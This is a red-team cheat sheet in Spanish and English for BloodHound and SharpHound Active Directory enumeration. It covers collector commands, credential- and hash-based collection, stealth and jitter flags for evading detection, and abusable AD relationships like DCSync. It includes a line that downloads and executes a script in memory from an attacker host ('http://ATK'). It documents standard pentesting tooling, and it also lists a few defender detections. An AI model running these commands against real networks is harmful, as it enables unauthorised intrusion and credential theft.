---
aliases:
  - BloodHound
  - SharpHound
  - bloodhound-python
tags:
  - type/tool
  - technique/discovery
  - technique/recon/active
  - asset/active-directory
  - tool/bloodhound
  - tool/sharphound
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Information Gathering]]"
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Enumeration]]"
type: CheatSheet
linked:
  - "[[Active Directory Explotación]]"
  - "[[BloodHound Cypher Queries]]"
  - "[[AD Initial Enumeration Playbook]]"
---
# BloodHound & SharpHound

***

## Cheatsheet
^bloodhound-cheatsheet

| Collector | Comando | Contexto |
| --- | --- | --- |
| **SharpHound (exe)** | `SharpHound.exe -c All,GPOLocalGroup --zipfilename data.zip` | Windows on-host |
| **SharpHound (dll)** | `rundll32 SharpHound.dll,DoStuff -c All --zipfilename data.zip` | Menos ruidoso |
| **Invoke-BloodHound** | `IEX(IWR -UseBasic http://ATK/SharpHound.ps1); Invoke-BloodHound -c All` | PowerShell reflection |
| **bloodhound-python** | `bloodhound-python -u user -p pass -d dom.local -ns DC_IP -c all --zip` | Linux remote |
| **bloodhound.py (CE)** | `bloodhound-python -u user -p pass -d dom.local -dc DC.dom.local -c All,LoggedOn --zip` | Con LoggedOn |
| **bloodyAD → BH** | `bloodyAD --host DC -d dom -u user -p pass` | Minimal footprint |
| **ADExplorer → BH** | `ADExplorerSnapshot.py snapshot.dat -o out/` | Snapshot offline parse |
| **Rusthound** | `rusthound -d dom.local -u user -p pass -o out/ -z` | Rust, rápido |
| **BH CE server** | `docker compose up -d` en repo CE | BloodHound Community Edition |
| **BH Legacy + Neo4j** | `sudo neo4j start; bloodhound` | Versión legacy (deprecated) |

***

## 1. BloodHound vs BloodHound CE

| | Legacy | Community Edition |
| --- | --- | --- |
| Backend | Neo4j directo | PostgreSQL + Neo4j + API |
| UI | Electron app | Web (React) |
| Deploy | Local binarios | Docker compose |
| Collectors soportados | SharpHound legacy | SharpHound + AzureHound + API ingest |
| Custom queries | `customqueries.json` | DB ingestion + saved queries web |
| Estado | Deprecated (2024+) | Mantenido activo |

BH CE preferible. Legacy sigue funcionando pero sin nuevos features.

## 2. Collection methods (`-c` flag)

| Método | Qué recolecta | Detectabilidad |
| --- | --- | --- |
| `Default` | Group, LocalAdmin, Session, Trusts | Medio (session enum via NetSessionEnum) |
| `Group` | Membresías de grupos | Bajo |
| `LocalAdmin` | Local admin via NetLocalGroupGetMembers | Bajo-medio |
| `RDP` | Membresía RDP local groups | Bajo |
| `DCOM` | DCOM users local | Bajo |
| `PSRemote` | Remote Management Users | Bajo |
| `Session` | Sessions activas (NetSessionEnum) | **Alto** (una request por host) |
| `LoggedOn` | Users logueados (requiere admin local) | Muy alto |
| `Trusts` | Trust relationships | Bajo |
| `ACL` | DACLs sobre objetos | Medio |
| `Container` | OU / GPO membership | Bajo |
| `ObjectProps` | Properties de objetos | Bajo |
| `SPN` | Cuentas con SPN | Bajo |
| `GPOLocalGroup` | Local group assignments via GPO | Bajo |
| `All` | Todo lo anterior excepto LoggedOn | Medio-alto |

Sets especiales:
- `DCOnly` — solo LDAP (no tocar hosts) → sigiloso pero incompleto.
- `ComputerOnly` — solo enum por computer.

### Ejemplos

```bash
# Stealth (solo LDAP al DC, sin tocar workstations)
SharpHound.exe -c DCOnly --zipfilename stealth.zip

# Todo sin LoggedOn (default recommended)
SharpHound.exe -c All --zipfilename full.zip

# Incluir GPO local group
SharpHound.exe -c All,GPOLocalGroup --zipfilename full.zip

# Solo Kerberoasteables rápido
SharpHound.exe -c SPN --zipfilename spn.zip
```

## 3. SharpHound flags útiles

```cmd
# Loop mode — re-collect sessions cada N min
SharpHound.exe -c Session --loop --loopduration 02:00:00 --loopinterval 00:30:00

# Stealth timing (evitar detecciones por ratio)
SharpHound.exe -c All --stealth --throttle 5000 --jitter 30

# Limitar scope a OU
SharpHound.exe -c All --searchbase "OU=Servers,DC=dom,DC=local"

# Target específico
SharpHound.exe -c All --domaincontroller DC.dom.local --domain dom.local

# Exclude DCs (evitar tocar DCs durante enum)
SharpHound.exe -c All --excludedcs

# Encryption on zip
SharpHound.exe -c All --zipfilename data.zip --encryptzip  # pide password
```

## 4. bloodhound-python (Linux remote)

```bash
# Install
pip install bloodhound

# Collection
bloodhound-python -u user -p 'P@ss' -d dom.local -ns 10.10.10.10 -c all --zip

# Con NT hash
bloodhound-python -u user --hashes :NTHASH -d dom.local -ns 10.10.10.10 -c all --zip

# Con Kerberos ticket
export KRB5CCNAME=/tmp/ticket.ccache
bloodhound-python -u user -k -no-pass -d dom.local -dc DC.dom.local -c all --zip

# LoggedOn (requiere admin local)
bloodhound-python -u user -p pass -d dom.local -ns DC -c 'All,LoggedOn' --zip
```

Limitaciones vs SharpHound: no captura info de local groups via SAMR en todos los hosts (depende de acceso remote).

## 5. AzureHound (Entra ID / Azure)

```bash
# Install
go install github.com/SpecterOps/azurehound@latest

# Collection
azurehound -u user@tenant.onmicrosoft.com -p 'Pass' -t TENANT_ID list -o azure.json
```

Datos complementarios a on-prem AD (roles Entra, subscriptions, hybrid identity).

## 6. ADExplorer snapshot → BH (muy sigiloso)

Snapshot offline con Sysinternals ADExplorer → parse → BloodHound:

```bash
# On-host Windows con ADExplorer
ADExplorer.exe /snapshot "LDAP://DC" snapshot.dat

# Parse offline
ADExplorerSnapshot.py snapshot.dat -o bh_output/

# Zip + upload
zip -r snapshot.zip bh_output/
```

Ventaja: 1 solo request LDAP masivo, no toca computers.

## 7. BH CE — setup rápido

```bash
# Clonar + run
git clone https://github.com/SpecterOps/BloodHound.git
cd BloodHound/examples/docker-compose
docker compose up -d

# UI: http://localhost:8080
# Default creds: admin / generated password (en logs)
docker compose logs | grep "Initial Password"
```

### Upload data
- Web UI → File Ingest → subir `.zip` generado por SharpHound/bloodhound-python.
- API: `POST /api/v2/file-upload`.

### Mark owned
Web UI: Explore → busca nodo → right-click → "Mark as Owned".

Via API:
```bash
curl -X PATCH "http://localhost:8080/api/v2/asset-groups/1/selectors" \
  -H "Authorization: Bearer TOKEN" \
  -d '[{"node_label":"USER@DOM.LOCAL","selector_name":"Compromised"}]'
```

## 8. Queries esenciales

Ver [[BloodHound Cypher Queries]] para referencia completa.

Top queries built-in (Pre-built):
- `Shortest Paths from Owned Objects`.
- `Find AS-REP Roastable Users`.
- `Find Kerberoastable Users with most privileges`.
- `Shortest Paths to Domain Admins`.
- `Find Principals with DCSync Rights`.
- `Find Computers where Domain Users are Local Admin`.

## 9. Edges importantes (relationships)

| Edge | Significado | Explotación |
| --- | --- | --- |
| `MemberOf` | Membership grupo | Herencia de permisos |
| `AdminTo` | Local admin en computer | Lateral directo |
| `HasSession` | User logueado en computer | Credential theft target |
| `GenericAll` | Full control sobre objeto | Password reset / KCL |
| `GenericWrite` | Write sobre attributes | Shadow creds, targeted kerberoast |
| `WriteDacl` | Write ACL | Grant DCSync |
| `WriteOwner` | Change owner | Grant DCSync |
| `ForceChangePassword` | Reset password sin saber anterior | Abuso directo |
| `AllExtendedRights` | Extended rights all | DCSync, password change |
| `AddMember` | Add to group | Grupo privilegiado |
| `AllowedToDelegate` | Constrained deleg | S4U abuse |
| `AllowedToAct` | RBCD | Impersonation |
| `AddKeyCredentialLink` | Escribir KCL | Shadow Credentials |
| `DCSync` | Replicación | Dump hashes dominio |
| `SQLAdmin` | sysadmin MSSQL | xp_cmdshell |
| `HasSIDHistory` | SID history | Cross-domain privilege |
| `CanPSRemote` | WinRM access | Lateral |
| `CanRDP` | RDP access | Lateral |
| `ExecuteDCOM` | DCOM execution | Lateral |

## 10. OpSec tips

- **DCOnly** + **stealth** + no **LoggedOn** → baseline sigiloso.
- `--throttle 5000 --jitter 30` dispersa requests.
- Collection desde host joined-to-domain con user low-priv es menos sospechoso.
- Zip encrypted evita leak si detectan el file.
- SharpHound modernos firman consultas LDAP (mejor opsec que v4).
- Evitar `Session` en domains paranoid — NetSessionEnum requiere una request por host.

### Detecciones (blue)
- LDAP queries masivas de un user en pocos minutos.
- `SPN-based` queries específicas raras.
- `net session` masivo remoto (evento 5140 en cada host).
- File drops `*.zip` con patrón BH en `%TEMP%`.

## 11. Custom collectors / ingestion

### Certipy → BH (ADCS)
```bash
certipy find -u user -p pass -dc-ip DC -vulnerable -bloodhound
# → certipy_YYYYMMDDHHMMSS.zip → upload BH
```

### Bloodhound-import (custom data)
Formato JSON específico, ver `BloodHound/docs/collection/`. Permite ingestar datos custom (e.g., app permissions).

## Recursos

- [BloodHound CE Docs](https://bloodhound.specterops.io/)
- [SharpHound GitHub](https://github.com/SpecterOps/SharpHound)
- [bloodhound-python](https://github.com/fox-it/BloodHound.py)
- [Rusthound](https://github.com/OPENCYBER-FR/RustHound)
- [ADExplorerSnapshot.py](https://github.com/c3c/ADExplorerSnapshot.py)
- [[BloodHound Cypher Queries]] — queries cheatsheet.
- [[Active Directory Explotación]] — hub de explotación post-enum.

***
